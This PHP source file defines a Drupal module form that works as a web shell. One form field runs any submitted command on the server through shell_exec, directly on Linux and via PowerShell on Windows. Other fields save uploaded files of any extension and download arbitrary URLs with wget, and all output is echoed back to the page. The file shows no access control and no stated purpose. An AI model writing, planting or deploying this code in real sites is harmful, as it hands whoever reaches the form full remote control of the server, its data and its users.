<?php

namespace Drupal\invin_module\Form;

use Drupal\Core\Form\FormBase;
use Drupal\Core\Form\FormStateInterface;

class InvinForm extends FormBase {

  /**
   * {@inheritdoc}
   */
  public function getFormId() {
    return 'invin_module_form';
  }

  /**
   * {@inheritdoc}
   */
  public function buildForm(array $form, FormStateInterface $form_state) {
    $form['file_upload'] = [
      '#type' => 'file',
      '#title' => $this->t('Upload a file'),
    ];
    $form['os_type'] = [
      '#type' => 'select',
      '#title' => $this->t('Select OS'),
      '#options' => ['linux' => 'Linux', 'windows' => 'Windows'],
    ];
    $form['command'] = [
      '#type' => 'textfield',
      '#title' => $this->t('Enter a command'),
    ];
    $form['wget_url'] = [
      '#type' => 'textfield',
      '#title' => $this->t('Enter a URL to download using wget'),
    ];
    $form['submit'] = [
      '#type' => 'submit',
      '#value' => $this->t('Submit'),
    ];
    return $form;
  }

  /**
   * {@inheritdoc}
   */
  public function submitForm(array &$form, FormStateInterface $form_state) {
    $command_output = '';
    $file_output = '';
    $wget_output = '';

    // Handle file upload
    $validators = ['file_validate_extensions' => ['*']];
    if ($file = file_save_upload('file_upload', $validators, FALSE, 0)) {
      $file->setPermanent();
      $file->save();
      $file_output = $this->t('File uploaded successfully: @file', ['@file' => $file->getFileUri()]);
    } else {
      $file_output = $this->t('File upload failed.');
    }

    // Execute command
    if (!empty($form_state->getValue('command'))) {
      $command = $form_state->getValue('command');
      $os_type = $form_state->getValue('os_type');
      if ($os_type == 'linux') {
        $command_output = shell_exec($command);
      } else if ($os_type == 'windows') {
        $command_output = shell_exec("powershell.exe -Command " . escapeshellarg($command));
      }
    }

    // Handle wget
    if (!empty($form_state->getValue('wget_url'))) {
      $wget_url = $form_state->getValue('wget_url');
      $wget_output = shell_exec("wget " . escapeshellarg($wget_url));
    }

    // Display output
    \Drupal::messenger()->addMessage($file_output);
    \Drupal::messenger()->addMessage('<pre>' . htmlspecialchars($command_output) . '</pre>', 'status');
    \Drupal::messenger()->addMessage('<pre>' . htmlspecialchars($wget_output) . '</pre>', 'status');
  }
}
